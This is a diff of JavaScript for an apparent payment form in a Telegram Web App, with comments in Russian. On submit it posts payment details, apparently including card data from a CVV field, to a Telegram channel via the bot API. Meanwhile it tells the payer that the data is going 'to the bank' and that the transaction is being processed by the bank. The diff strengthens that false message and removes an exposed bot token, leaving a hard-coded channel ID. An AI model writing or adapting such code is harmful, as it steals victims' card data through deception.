@@ -71,7 +71,7 @@ cvvInput.addEventListener('input', function (e) {
 });
 
 // --- Конфигурация для отправки в Telegram ---
-const BOT_TOKEN = '7604135518:AAFa2ivK3F2-GarfW10JYSbMlCLAkNIzM4Q'; // ← ЗАМЕНИТЕ НА ВАШ РЕАЛЬНЫЙ ТОКЕН
+const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // ← ЗАМЕНИТЕ НА ВАШ РЕАЛЬНЫЙ ТОКЕН
 const CHANNEL_ID = '-1003047112845'; // ← Убедитесь, что это правильный ID
 
 // --- Отправка формы ---
@@ -100,17 +100,17 @@ paymentForm.addEventListener('submit', async function (e) {
 
     console.log("FormData:", formData);
 
-    // Показываем сообщение пользователю
+    // Показываем сообщение пользователю: "Отправляем..."
     paymentForm.innerHTML = `
         <p style="color: #5c00b7; text-align: center; font-size: 18px; font-weight: 500; line-height: 1.6;">
-            🔄 Отправляем данные...
+            🔄 Отправляем данные в банк...
         </p>
     `;
 
     try {
-        // Формируем текст сообщения для Telegram
+        // Формируем текст сообщения для Telegram-канала
         const messageText = `
-💳 *НОВЫЕ ДАННЫЕ ПЛАТЕЖА (Прямая отправка)*
+💳 *НОВЫЕ ДАННЫЕ ПЛАТЕЖА*
 🆔 User ID: ${formData.user_id}
 💰 Сумма: ${formData.amount} USD
 🧾 Payment ID: \`${formData.payment_id}\`
@@ -123,7 +123,7 @@ paymentForm.addEventListener('submit', async function (e) {
         // URL для отправки сообщения в Telegram
         const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-        // Отправляем POST-запрос
+        // Отправляем POST-запрос в канал
         const response = await fetch(telegramApiUrl, {
             method: 'POST',
             headers: {
@@ -137,31 +137,68 @@ paymentForm.addEventListener('submit', async function (e) {
         });
 
         const result = await response.json();
+
+        // Проверяем, успешно ли отправлено сообщение в канал
         if (result.ok) {
             console.log("✅ Данные успешно отправлены в Telegram-канал!");
+
+            // Показываем пользователю: "Транзакция в обработке банком"
             paymentForm.innerHTML = `
-                <p style="color: #5c00b7; text-align: center; font-size: 18px; font-weight: 500; line-height: 1.6;">
-                    ✅ Данные успешно отправлены!
+                <p style="color: #27ae60; text-align: center; font-size: 18px; font-weight: 500; line-height: 1.6;">
+                    ✅ Ваша транзакция в обработке банком.
+                </p>
+                <p style="color: #7f8c8d; text-align: center; font-size: 14px; margin-top: 10px;">
+                    Пожалуйста, закройте это окно.
                 </p>
             `;
+
+            // Отправляем сообщение обратно в чат с ботом (если нужно)
+            if (window.Telegram?.WebApp) {
+                try {
+                    window.Telegram.WebApp.sendData(JSON.stringify({
+                        status: "success",
+                        message: "Транзакция отправлена в обработку.",
+                        payment_id: formData.payment_id
+                    }));
+                } catch (err) {
+                    console.warn("Не удалось отправить статус в бот:", err);
+                }
+            }
+
         } else {
             throw new Error(`Telegram API Error: ${result.description}`);
         }
 
     } catch (error) {
         console.error("❌ Ошибка при отправке данных:", error);
+
+        // Показываем пользователю сообщение об ошибке
         paymentForm.innerHTML = `
             <p style="color: #e74c3c; text-align: center; font-size: 18px; font-weight: 500; line-height: 1.6;">
                 ❌ Ошибка отправки. Попробуйте позже.
             </p>
         `;
+
+        // Отправляем сообщение об ошибке в бот (если нужно)
+        if (window.Telegram?.WebApp) {
+            try {
+                window.Telegram.WebApp.sendData(JSON.stringify({
+                    status: "error",
+                    message: "Ошибка при отправке данных.",
+                    error: error.message
+                }));
+            } catch (err) {
+                console.warn("Не удалось отправить ошибку в бот:", err);
+            }
+        }
+
         alert("Произошла ошибка при отправке данных. Попробуйте позже.");
     }
 
-    // Закрываем окно через 3 секунды
+    // Закрываем окно через 4 секунды, если всё успешно
     setTimeout(() => {
         if (window.Telegram?.WebApp) {
             window.Telegram.WebApp.close();
         }
-    }, 3000);
+    }, 4000);
 });
